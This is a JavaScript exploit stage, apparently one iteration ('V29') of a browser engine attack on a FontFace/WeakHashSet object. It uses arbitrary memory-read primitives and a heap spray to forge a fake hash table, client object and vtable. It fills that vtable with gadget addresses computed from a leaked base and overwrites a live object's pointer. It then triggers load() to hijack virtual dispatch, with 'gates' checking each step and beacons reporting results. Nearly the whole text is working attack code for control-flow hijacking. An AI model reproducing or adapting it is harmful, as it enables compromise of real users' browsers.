// V29 Patch: THE FIXED FORGE + the council ladder (born | weak | d0 | d1)
//
// ROOT CAUSE (council-verified): put32(sv,off,val) used INTEGER-INDEX
// ASSIGNMENT on a DataView — a silent NO-OP (creates own properties on the
// wrapper; backing store untouched). Every V24-V28 run shipped the marker
// spray's ORIGINAL metadata: keyCount = 0x13579BDF = 324,508,639. The engine:
// removeIf scanned tableSize=0 buckets (nothing), then computeSize() returned
// 324,508,639 and the WeakHashSet Mapper's reserveInitialCapacity(324M*8)
// demanded ~2.6 GB → fatal allocation failure → the identical LOAD-PRE
// "memory warning" death in EVERY arm. No dispatch/removal/promise/timer
// difference ever manifested. THE FIX: sv.setUint32(off, val, true).
//
// THE LADDER (council-approved, ?arm= selects):
//   born : keyCount=0, all buckets empty. Pure machinery test (empty cleanup,
//          empty iteration, both transitions, timer stop). Expect RETURN,
//          status 4, op-count(face+0x60)=0, metadata {0,0,3,4} unchanged.
//   weak : keyCount=1, bucket[0]=impl, impl.m_ptr=0. removeIf REMOVES the
//          entry (~Ref -> deref on our impl copy: rc 3->2, no destroy),
//          writes the deleted marker + keyCount 1->0 into OUR buffer, empty
//          iteration. Expect RETURN, op-count=0, bucket=0xFFFF..., meta {1,0,3,4}.
//   d0   : keyCount=1, bucket[0]=impl, impl.m_ptr=S+0x50 (fake client).
//          ALL 8 vtable slots = NOPG. One full no-op dispatch (plus virtual
//          ref/deref at +0x30/+0x38 if virtual on this fork — covered either
//          way). Expect RETURN, status 4, op-count=1, meta {0,1,3,4} unchanged.
//   d1   : d0 but slot3 (+0x18) = the REAL fontStateChanged gadget (FSG).
//          The first REAL dispatch: Loading (gadget: break), then Failure
//          (gadget: real-promise path). Expect RETURN + dispatch witness.
//
// GATES (council-mandated, all via DataView methods / Uint8Array reads,
// NO readAt after craft, NO integer-index reads on sv — they would read the
// shadow properties and false-pass):
//   G1: metadata exact-hex vs the arm's expected 16-byte string
//       born:  00000000000000000300000004000000
//       others:00000000010000000300000004000000
//       + explicit marker-A-gone negative control
//   G2: face+0x58 == S+0x30
//   G3: face+0x60/+0x64 == 0 (template counters unchanged)
//   G4: sources vector +0x48..0x57 ALL ZERO (hard abort if not)
//   G5: status=0, override=1, timer vptr!=0, thread!=0, fire times=0,
//       heapItem=0 (predicated — abort on any wrong value)
// A failed gate = NO load().
//
// WITNESS: one composite post-load beacon (status, op-count, metadata hex,
// buckets, impl rc, timer sanity, promise pre/post) + the forge diff.

/* ==== V29: THE FIXED FORGE ==== */

try{
  if(MBUF>0n&&VP>0n&&bufs&&bufs.length>0&&fbRaw&&fbRaw.length>=128&&l2raw&&l2raw.length>=128){
    var FSG=BASE+0x5B3D6B0n, NOPG=BASE+0x4001750n;
    var mIdx=-1;
    var tH=readAt(MBUF+0x48n,8); var tV=qAt(tH,0);
    if((tV>>32n)===0xAAn)mIdx=Number(tV&0xFFFFFFFFn);
    bs('V29-TAG-mIdx='+mIdx);

    if(mIdx>=0&&mIdx<32){
      var sv=new DataView(window.__v688.spray[mIdx]);
      var S=MBUF;
      var hitBuf=bufs[0][0];

      var ARM=(function(){var m=/[?&]arm=(born|weak|d0|d0a|d0b|d1)/.exec(location.search);return m?m[1]:'born';})();
      bs('V29-ARM='+ARM);

      /* ---- STEP 1: ALL readAt FIRST ---- */
      var promiseAddr=qAt(readAt(FB+0x18n,8),0);
      bs('V29-PROMISE-ADDR='+hex(promiseAddr));
      var promiseBefore=readAt(promiseAddr,0x30);
      bs('V29-PROMISE-BEFORE='+promiseBefore);

      bs('V29-SIBLING-SCAN');
      var sib=0n, sibBk=0n;
      for(var sa=FB-0x2000n;sa<FB+0x2000n&&sib===0n;sa+=8n){
        var q0h=readAt(sa,8);
        if(qAt(q0h,0)===VP){
          var bkH=readAt(sa+0x10n,8);
          var bk=qAt(bkH,0);
          if(bk>0x1000000000n&&bk!==S&&bk!==FB&&bk!==self&&bk<0x10000000000n){sib=sa;sibBk=bk;}
        }
      }
      if(sibBk===0n){bs('V29-NO-SIBLING');verd('err','V29 no sibling');throw 'no sibling';}
      bs('V29-SIBLING='+hex(sib)+'-backing='+hex(sibBk));

      var timerH=readAt(sibBk+0x88n,0x38);
      bs('V29-TIMER-BORROWED='+timerH);

      /* ---- STEP 2: build the FORGE (METADATA VIA setUint32 - THE FIX) ---- */
      bs('V29-FORGE-BUILD');

      /* impl = real L2 byte-copy; m_ptr per arm */
      for(var ib=0;ib<0x20;ib++)sv.setUint8(ib,parseInt(l2raw.substr(ib*2,2),16));
      if(ARM==='weak')        dvSetBig(sv,0x08,0n);        /* null client -> entry removed */
      else if(ARM==='d0a')    dvSetBig(sv,0x08,FB);         /* the REAL FontFace wrapper -> real vtable, real everything */
      else if(ARM==='d0'||ARM==='d1'||ARM==='d0b')dvSetBig(sv,0x08,S+0x50n); /* fake client */
      else                    dvSetBig(sv,0x08,0n);        /* born: unreferenced anyway */
      var implRcBefore=sv.getUint32(0x00,true);
      bs('V29-IMPL-rc='+implRcBefore+'-m_ptr='+hex(dvGetBig(sv,0x08)));

      /* *** THE FIX: metadata via DataView.setUint32 (put32 was a NO-OP!) *** */
      sv.setUint32(0x20, 0, true);                 /* deletedCount = 0 */
      sv.setUint32(0x24, (ARM==='born')?0:1, true);/* keyCount: 0 born, else 1 */
      sv.setUint32(0x28, 3, true);                 /* tableSizeMask = 3 */
      sv.setUint32(0x2C, 4, true);                 /* tableSize = 4 */

      /* buckets */
      if(ARM==='born'){
        dvSetBig(sv,0x30,0n); dvSetBig(sv,0x38,0n);
        dvSetBig(sv,0x40,0n); dvSetBig(sv,0x48,0n);
      }else{
        dvSetBig(sv,0x30,S);                       /* bucket[0] = impl */
        dvSetBig(sv,0x38,0n); dvSetBig(sv,0x40,0n); dvSetBig(sv,0x48,0n);
      }

      /* client = real wrapper byte-copy (used by d0/d0b/d1; unreferenced otherwise)
       * d0a uses the REAL wrapper at FB (m_ptr=FB) - no copy involved.
       * d0b keeps the copy's +0x00 = the REAL vtable pointer (UNPATCHED)
       *      -> dispatches run the REAL FontFace methods on the fake client. */
      for(var cb=0;cb<0x40;cb++)sv.setUint8(0x50+cb,parseInt(fbRaw.substr(cb*2,2),16));
      if(ARM==='d0'||ARM==='d1')dvSetBig(sv,0x50+0x00,S+0x90n); /* fake vtable */
      /* d0b: leave client+0x00 = the real VP (from fbRaw) */
      /* client+0x18 promise deliberately kept = the REAL promise (fbRaw copy) */
      var clientPromise=dvGetBig(sv,0x50+0x18);
      bs('V29-CLIENT-PROMISE='+hex(clientPromise)+(clientPromise===promiseAddr?'-IS-REAL-OK':'-MISMATCH'));
      if(ARM==='d0b')bs('V29-CLIENT-VT-REAL='+hex(dvGetBig(sv,0x50)));

      /* vtable */
      for(var vs=0;vs<8;vs++)dvSetBig(sv,0x90+vs*8,NOPG);
      if(ARM==='d1')dvSetBig(sv,0x90+0x18,FSG);    /* slot3 = real fontStateChanged */

      bs('V29-FORGE-BUILT-T='+(S+0x30n).toString(16)+'-slot3='+hex(dvGetBig(sv,0x90+0x18)));

      var preA=new Uint8Array(window.__v688.spray[mIdx].slice(0,0x100));

      /* ---- STEP 3: craft the FACE ---- */
      bs('V29-FACE-CRAFT');
      for(var sz=0x28;sz<=0x47;sz++)hitBuf[sz]=0;
      /* +0x48..0x57: the SOURCES VECTOR — poisoned by the read-carrier
       * (G4 in the first run read 3f/65/0x824/46 = scan-grid garbage;
       * m_sources.size() at +0x54 was 0x46 = 70 phantom sources!). MUST
       * be zeroed so pump sees an empty vector. */
      for(var sz2=0x48;sz2<=0x57;sz2++)hitBuf[sz2]=0;
      /* +0x60..0x67: the WeakHashSet counters — also poisoned by the
       * read-carrier (G3 read 0x8c00000055). Zero them in the FACE craft
       * (runs after all readAt). */
      for(var c2=0x60;c2<=0x67;c2++)hitBuf[c2]=0;
      hitBuf[0x82]=0;                              /* status = Pending */
      hitBuf[0x83]=1;                              /* sourcesPopulated */
      hitBuf[0x87]=1;                              /* override = Block */
      for(var bl=0x84;bl<=0x89;bl++)hitBuf[bl]=1;
      for(var tb=0;tb<0x38;tb++)hitBuf[0x88+tb]=parseInt(timerH.substr(tb*2,2),16);
      for(var hz=0x98;hz<0xA8;hz++)hitBuf[hz]=0;   /* fire times = 0 */
      for(var hz2=0xA8;hz2<0xB0;hz2++)hitBuf[hz2]=0;/* heapItem = NULL */

      /* ---- STEP 4: install (LAST write) ---- */
      for(var hb=0;hb<8;hb++)hitBuf[0x58+hb]=Number(((S+0x30n)>>BigInt(hb*8))&0xFFn);

      /* ---- STEP 5: GATES ---- */
      var gatesOK=true;
      function hx(u8){var s='';for(var i=0;i<u8.length;i++)s+=('0'+u8[i].toString(16)).slice(-2);return s;}

      /* G1: metadata exact-hex (DataView reads only) */
      var g1bytes=[];for(var g1=0;g1<16;g1++)g1bytes.push(sv.getUint8(0x20+g1));
      var g1hex=g1bytes.map(function(x){return ('0'+x.toString(16)).slice(-2);}).join('');
      var expectHex=(ARM==='born')?'00000000000000000300000004000000':'00000000010000000300000004000000';
      bs('V29-G1-meta-hex='+g1hex+'-expect='+expectHex);
      var g1d0=sv.getUint32(0x20,true),g1kc=sv.getUint32(0x24,true),g1m=sv.getUint32(0x28,true),g1s=sv.getUint32(0x2C,true);
      bs('V29-G1-dwords-d='+g1d0+'-kc='+g1kc+'-mask='+g1m+'-size='+g1s);
      if(g1hex!==expectHex){gatesOK=false;bs('V29-G1-FAIL');}
      if(g1d0===0x02468ACE||g1kc===0x13579BDF){gatesOK=false;bs('V29-G1-FAIL-MARKER-A-STILL-PRESENT');}

      /* G2: face+0x58 */
      var g2=0n;for(var g2b=0;g2b<8;g2b++)g2|=BigInt(hitBuf[0x58+g2b])<<BigInt(g2b*8);
      bs('V29-G2-face58='+hex(g2));
      if(g2!==(S+0x30n)){gatesOK=false;bs('V29-G2-FAIL');}

      /* G3: face counters unchanged */
      var g3=0n;for(var g3b=0;g3b<8;g3b++)g3|=BigInt(hitBuf[0x60+g3b])<<BigInt(g3b*8);
      bs('V29-G3-face60='+hex(g3));
      if(g3!==0n){gatesOK=false;bs('V29-G3-FAIL');}

      /* G4: sources vector all zero (hard abort if dirty) */
      var g4dirty=false;for(var g4=0x48;g4<0x58;g4++)if(hitBuf[g4]!==0)g4dirty=true;
      bs('V29-G4-sources='+hx(hitBuf.slice(0x48,0x58)));
      if(g4dirty){gatesOK=false;bs('V29-G4-FAIL-SOURCES-DIRTY');}

      /* G5: status/override/timer PREDICATED */
      var g5vptr=0n;for(var q9=0;q9<8;q9++)g5vptr|=BigInt(hitBuf[0x90+q9])<<BigInt(q9*8);
      var g5thread=0n;for(var q10=0;q10<8;q10++)g5thread|=BigInt(hitBuf[0xB0+q10])<<BigInt(q10*8);
      var g5heap=0n;for(var q11=0;q11<8;q11++)g5heap|=BigInt(hitBuf[0xA8+q11])<<BigInt(q11*8);
      var g5fire=0n;for(var q12=0;q12<16;q12++)g5fire|=BigInt(hitBuf[0x98+q12])<<BigInt(q12*8);
      bs('V29-G5-status='+hitBuf[0x82]+'-ovr='+hitBuf[0x87]+'-vptr='+hex(g5vptr)+'-thread='+hex(g5thread)+'-heap='+hex(g5heap)+'-fire='+hex(g5fire));
      if(!(hitBuf[0x82]===0&&hitBuf[0x87]===1&&g5vptr!==0n&&g5thread!==0n&&g5heap===0n&&g5fire===0n)){
        gatesOK=false;bs('V29-G5-FAIL');
      }

      if(!gatesOK){
        bs('V29-GATE-FAIL-ABORT-NO-LOAD');
        verd('err','V29 gate fail - load() NOT called');
      }else{
        bs('V29-GATES-ALL-OK');

        /* ---- STEP 6: THE DISPATCH ---- */
        bs('V29-LOAD-PRE');
        var loadReturned=false;
        try{
          faces[zi].load();
          loadReturned=true;
          bs('V29-LOAD-RETURNED');
        }catch(e){
          bs('V29-LOAD-THREW-'+String(e&&e.message?e.message:'?'));
        }

        /* ---- STEP 7: COMPOSITE WITNESS (one beacon) ---- */
        var opcnt=hitBuf[0x60]|(hitBuf[0x61]<<8)|(hitBuf[0x62]<<16)|(hitBuf[0x63]<<24);
        var postMeta='';for(var pm=0;pm<16;pm++)postMeta+=('0'+sv.getUint8(0x20+pm).toString(16)).slice(-2);
        var postBk0=dvGetBig(sv,0x30);
        var postRc=sv.getUint32(0x00,true);
        var postVt=hitBuf[0x90]!==0;
        bs('V29-WIT-status='+hitBuf[0x82]+'-opcount='+opcnt+'-meta='+postMeta+'-bk0='+hex(postBk0)+'-implrc='+postRc+'-timerVptrOK='+postVt);

        try{bs('V29-JS-STATUS='+faces[zi].status);}catch(e){bs('V29-JS-STATUS-ERR');}

        /* promise witness (readAt safe now) */
        var promiseAfter=readAt(promiseAddr,0x30);
        if(promiseAfter!==promiseBefore)bs('WIT-V29-PROMISE-CHANGED');
        else bs('WIT-V29-PROMISE-UNCHANGED');

        /* forge diff */
        var curA=new Uint8Array(window.__v688.spray[mIdx].slice(0,0x100));
        var diffs=[];
        for(var wq=0;wq<0x100;wq+=8){
          var cur=0n,old=0n;
          for(var wb=0;wb<8;wb++){
            cur|=BigInt(curA[wq+wb])<<BigInt(wb*8);
            old|=BigInt(preA[wq+wb])<<BigInt(wb*8);
          }
          if(cur!==old)diffs.push('@'+(S+BigInt(wq)).toString(16)+':'+old.toString(16)+'>'+cur.toString(16));
        }
        if(diffs.length)bs('WIT-V29-FORGE-WRITE-'+diffs.slice(0,10).join('|'));
        else bs('WIT-V29-FORGE-nowrite');

        for(var rb=0;rb<8;rb++)hitBuf[0x58+rb]=Number((L1>>BigInt(rb*8))&0xFFn);
        bs('V29-RESTORED');

        if(loadReturned){
          verd('ok','V29 '+ARM+' RETURNED');
          bs('V29-DONE-'+ARM+'-RETURNED');
        }else{
          verd('err','V29 '+ARM+' crashed');
          bs('V29-DONE-'+ARM+'-CRASHED');
        }
      }

    }else bs('V29-SKIP-bad-idx');
  }else bs('V29-SKIP-missing-data');
}catch(e29){bs('V29-ERR-'+String(e29&&e29.message?e29.message:'?'));}
/* ==== V29 END ==== */
